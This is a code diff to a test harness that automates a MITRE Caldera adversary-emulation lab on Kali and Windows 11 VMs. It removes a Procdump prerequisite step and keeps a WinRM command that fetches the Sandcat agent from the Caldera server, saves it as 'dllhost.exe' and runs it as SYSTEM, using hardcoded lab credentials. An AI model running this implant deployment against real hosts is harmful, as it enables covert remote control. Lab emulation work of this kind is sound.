@@ -110,8 +110,6 @@ async function testCalderaConnectivity() {
 // ─── Prereq Command Execution Tests ──────────────────────────────────────────
 
 // Prereqs are now generated with smart existence checks in generateFocusedData.js.
-// Each kali_prereq is wrapped in `if [ -f "$PAYLOAD_PATH" ]; then echo "ALREADY_PRESENT"; else ... fi`
-// ($HOME is used instead of ~ because ~ does not expand inside double quotes in bash)
 // Each win_prereq is wrapped in `if (Test-Path "PAYLOAD_PATH") { ... } else { ... }`
 // systemctl commands use sudo systemctl (kali has NOPASSWD sudoers for caldera.service)
 
@@ -258,9 +256,7 @@ async function testSandcatDeploy() {
 // deleteAdversary(advId)      — DELETE /api/rest { index: "adversaries", adversary_id: advId }
 //
 // Additional functions:
-// normalizePrereq(script)     — collapses multiline shell scripts to single line
 // normalizeWinPrereq(script)  — collapses multiline PS to semicolon-separated
-// installKaliPrereq(ip, s)    — runs Kali prereq via SSH
 // installWinPrereq(ip, s)     — runs Windows prereq via WinRM
 // sendStatus(ws, step, status, msg) — sends WS status update + console.logs it
 
@@ -293,13 +289,11 @@ async function testFullPipeline() {
   const group = `test-${Date.now()}`
   const taskName = `CalderaSandcat-${group}`
 
-  const kaliPrereq = `if [ -f "$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe" ]; then echo "ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && wget -q "https://download.sysinternals.com/files/Procdump.zip" -O /tmp/Procdump.zip && unzip -o /tmp/Procdump.zip -d /tmp/Procdump && cp /tmp/Procdump/procdump64.exe $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe && rm -rf /tmp/Procdump.zip /tmp/Procdump && sudo systemctl restart caldera; fi`
-
   let agentPaw = null
 
   try {
     // ── Step 1: Clean slate ──
-    console.log("\n  [1/6] Cleaning previous agents, processes, and tasks...")
+    console.log("\n  [1/5] Cleaning previous agents, processes, and tasks...")
     try {
       const agents = await calderaRest("POST", { index: "agents" })
       for (const a of agents) {
@@ -317,25 +311,8 @@ async function testFullPipeline() {
     } catch {}
     console.log("    => clean")
 
-    // ── Step 2: Install prereqs on Kali ──
-    console.log("\n  [2/6] Running kali prereq (Procdump download + Caldera restart)...")
-    const prereqResult = await sshRun(KALI_IP, "kali", "kali", kaliPrereq)
-    console.log(`    => ${prereqResult.slice(0, 200)}`)
-    if (prereqResult.includes("Procdump.zip") && !prereqResult.includes("ALREADY_PRESENT")) {
-      console.log("    => Caldera was restarted, waiting to come back (120s timeout)...")
-      const start = Date.now()
-      while (Date.now() - start < 120000) {
-        try {
-          await calderaRest("POST", { index: "agents" })
-          console.log(`    => Caldera ready after ${Math.round((Date.now() - start) / 1000)}s`)
-          break
-        } catch {}
-        await new Promise(r => setTimeout(r, 1000))
-      }
-    }
-
-    // ── Step 3: Deploy sandcat via Scheduled Task as SYSTEM ──
-    console.log(`\n  [3/6] Deploying sandcat as SYSTEM (group=${group})...`)
+    // ── Step 2: Deploy sandcat via Scheduled Task as SYSTEM ──
+    console.log(`\n  [2/5] Deploying sandcat as SYSTEM (group=${group})...`)
     const dlResult = await winrmRun(WIN11_IP, "localuser", "password",
       `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
     console.log(`    => download: ${dlResult.trim()}`)
@@ -485,7 +462,7 @@ async function testFullPipeline() {
 // Steps:
 //   powerCheck       — verify VMs exist and are powered on via Ludus API
 //   cliCheck         — test SSH (22) and WinRM (5986) port reachability
-//   prereqInstall    — run kali_prereq (SSH) and win_prereq (WinRM) if provided
+//   prereqInstall    — run win_prereq (WinRM) if provided
 //   agentDeploy      — WinRM: download sandcat binary, launch via Scheduled Task as SYSTEM
 //   agentWait        — poll Caldera agents every 3s until matching group
 //   abilityLookup    — fetch full ability object for diagnostics
@@ -522,16 +499,6 @@ async function testFullPipeline() {
 //   [server] testAbility caught error: error message
 
 // ─── Prereq Generation (in generateFocusedData.js) ──────────────────────────
-//
-// PAYLOAD_DOWNLOADS entries include a `dest` field specifying the final
-// payload path on Kali. mergeWithPayloadSteps() wraps kali_steps:
-//
-//   kali_prereq = `if [ -f "$PAYLOAD_DIR/procdump.exe" ]; then echo "ALREADY_PRESENT"; else ...; fi`
-// ($HOME expands correctly inside double quotes; ~ does not)
-//
-// FIXED: ~ changed to $HOME because ~ inside double quotes is literal (~expands only unquoted in bash).
-// FIXED: strip() replaces `systemctl` → `sudo systemctl` because Caldera is a root-level service.
-//        kali has NOPASSWD sudoers for caldera.service (set in kaliAnsibleStart.yml).
 // FIXED: waitForCaldera() polls /api/rest every 1s for 120s after prereq restart, then proceeds.
 //
 // Kali prerun in kaliAnsibleStart.yml:
